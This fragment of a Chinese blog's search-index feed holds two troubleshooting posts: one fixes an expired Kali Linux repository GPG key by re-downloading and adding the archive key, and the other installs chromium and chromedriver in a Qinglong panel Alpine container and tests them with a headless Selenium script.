      <url>/2023/02/26/W%20%E6%A0%A1%E9%AA%8C%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E6%97%B6%E5%87%BA%E9%94%99%E3%80%82%E6%AD%A4%E4%BB%93%E5%BA%93%E6%9C%AA%E8%A2%AB%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BB%8D%E7%84%B6%E4%BD%BF%E7%94%A8%E6%AD%A4%E5%89%8D%E7%9A%84%E7%B4%A2%E5%BC%95%E6%96%87%E4%BB%B6%E3%80%82GPG%20%E9%94%99%E8%AF%AF%EF%BC%9Ahttpmirrors.ustc.edu.cnkali%20kali-rolling/</url>
      
        <content type="html"><![CDATA[<p>报错如下</p><pre><code>┌──(root💀kali)-[~]└─# sudo apt-get update                                                                                                                                                     2 ⚙获取:1 http://kali.download/kali kali-rolling InRelease [41.2 kB]错误:1 http://kali.download/kali kali-rolling InRelease  下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;已下载 41.2 kB，耗时 3秒 (15.7 kB/s)正在读取软件包列表... 完成W: 校验数字签名时出错。此仓库未被更新，所以仍然使用此前的索引文件。GPG 错误：http://kali.download/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: 无法下载 http://http.kali.org/kali/dists/kali-rolling/InRelease  下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。                                                                                                                                                                                ┌──(root💀kali)-[~]└─# wget archive.kali.org/archive-key.asc                                                                                                                                   2 ⚙--2023-02-26 06:31:16--  http://archive.kali.org/archive-key.asc正在解析主机 archive.kali.org (archive.kali.org)... 192.99.45.140正在连接 archive.kali.org (archive.kali.org)|192.99.45.140|:80... 已连接。已发出 HTTP 请求，正在等待回应... 200 OK长度：3155 (3.1K) [application/octet-stream]正在保存至: “archive-key.asc”archive-key.asc            100%[===============================&gt;]   3.08K  1.46KB/s  用时 2.1s    2023-02-26 06:31:20 (1.46 KB/s) - 已保存 “archive-key.asc” [3155/3155])</code></pre><p>​<br>​    ┌──(root💀kali)-[<del>]<br>​    └─# apt-key add archive-key.asc                                                                                                                                             2 ⚙<br>​    Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).<br>​    OK<br>​<br>​    ┌──(root💀kali)-[</del>]<br>​    └─# sudo apt-get update                                                                                                                                                     2 ⚙<br>​    获取:1 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling InRelease [41.2 kB]<br>​    获取:2 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;main amd64 Packages [19.5 MB]<br>​    获取:3 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;main amd64 Contents (deb) [45.4 MB]<br>​    获取:4 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;contrib amd64 Packages [116 kB]<br>​    获取:5 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;contrib amd64 Contents (deb) [172 kB]<br>​    获取:6 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;non-free amd64 Packages [222 kB]<br>​    获取:7 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;non-free amd64 Contents (deb) [931 kB]<br>​    已下载 66.3 MB，耗时 49秒 (1,360 kB&#x2F;s)<br>​    正在读取软件包列表… 完成</p><p>解决方法如下</p><pre><code>wget archive.kali.org/archive-key.asc   //下载签名apt-key add archive-key.asc   //安装签名</code></pre>]]></content>
      
      
      <categories>
          
          <category> 遇到的问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>青龙面板使用selenium遇到的问题 chromedriver</title>
      <link href="/2023/02/18/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E4%BD%BF%E7%94%A8selenium%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%20chromedriver/"/>
      <url>/2023/02/18/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E4%BD%BF%E7%94%A8selenium%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%20chromedriver/</url>
      
        <content type="html"><![CDATA[<p>青龙里的linux系统是轻量级的Alpine Linux 镜像，所以安装命令不是yum也不是apt，而是apk</p><p>1.先安装selenium依赖</p><p>这里不再做介绍，自行百度</p><p>2.进入青龙 docker 容器</p><pre><code>docker exec -it &#39;容器名称&#39; bash#或docker exec -it &#39;容器ID&#39; bash</code></pre><p>3.安装chromium</p><pre><code>apk add chromium</code></pre><p>4.安装chromedriver</p><pre><code>apk add chromium-chromedriver</code></pre><p>5.使用以下代码测试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver <span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Optionsoptions <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--disable-dev-shm-usage'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-blink-features=AutomationControlled"</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">"excludeSwitches"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"enable-automation"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--ignore-certificate-errors'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">"excludeSwitches"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"enable-logging"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">'useAutomationExtension'</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>browser <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span>browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>browser<span class="token punctuation">.</span>title<span class="token punctuation">)</span> browser<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 遇到的问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青龙面板 </tag>
            
            <tag> Python </tag>
            
            <tag> chromedriver </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
